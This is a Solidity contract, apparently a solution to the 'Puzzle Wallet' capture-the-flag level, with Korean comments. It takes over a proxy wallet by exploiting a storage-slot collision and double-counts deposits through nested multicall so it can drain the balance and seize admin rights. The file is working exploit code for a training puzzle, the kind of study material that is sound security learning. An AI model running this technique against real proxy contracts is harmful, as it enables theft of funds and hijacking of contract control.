// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

interface PuzzleProxy {
    function pendingAdmin() external returns (address);
    function admin() external returns (address);
    function proposeNewAdmin(address) external;
    function approveNewAdmin(address) external;
    function upgradeTo(address) external;
}
interface PuzzleWallet {
    function owner() external returns (address);
    function maxBalance() external returns (uint256);
    function init(uint256) external;
    function setMaxBalance(uint256) external;
    function addToWhitelist(address) external;
    function deposit() external payable;
    function execute(address, uint256, bytes calldata) external payable;
    function multicall(bytes[] calldata) external payable;
}
contract Solve {
    address target;

    constructor(address _target) payable {
        target = _target;
    }

    function attack() public {
        /* multicall([ <= depositCalled를 우회하기 위해 multicall 1번당 deposit을 중첩시키는 형태로 사용
                multicall([deposit()]), <- 0.001 이더 입금, 실제 적용됨
                deposit(), <- 0.001 이더 입금, 하지만 실제로는 적용되지 않음
                execute(address(this), 0.002, "")
         * ])
         */
        bytes memory depositData = abi.encodeWithSelector(PuzzleWallet(target).deposit.selector);
        bytes memory executeData = abi.encodeWithSelector(
            PuzzleWallet(target).execute.selector, 
            address(this), 
            payable(target).balance * 2, 
            ""
        );
        bytes[] memory multicallData = new bytes[](1);
        bytes[] memory data = new bytes[](3);

        multicallData[0] = depositData;

        data[0] = abi.encodeWithSelector(PuzzleWallet(target).multicall.selector, multicallData);
        data[1] = depositData;
        data[2] = executeData;

        // Slot 0 충돌로 PuzzleWallet의 owner를 공격자 주소로 변경
        PuzzleProxy(target).proposeNewAdmin(address(this));

        // setMaxBalance 함수를 실행하기 위해 Whitelist 주소로 공격자 주소 추가
        PuzzleWallet(target).addToWhitelist(address(this));

        // setMaxBalance 함수 실행을 위해 컨트랙트에 있는 0.001 이더를 0 상태로 인출
        PuzzleWallet(target).multicall{value: payable(target).balance}(data);

        // PuzzleProxy의 admin을 공격자 주소로 변경하기 위해 Slot 1 Collision을 setMaxBalance 함수로 유도
        PuzzleWallet(target).setMaxBalance(uint256(uint160(address(this))));
    }
}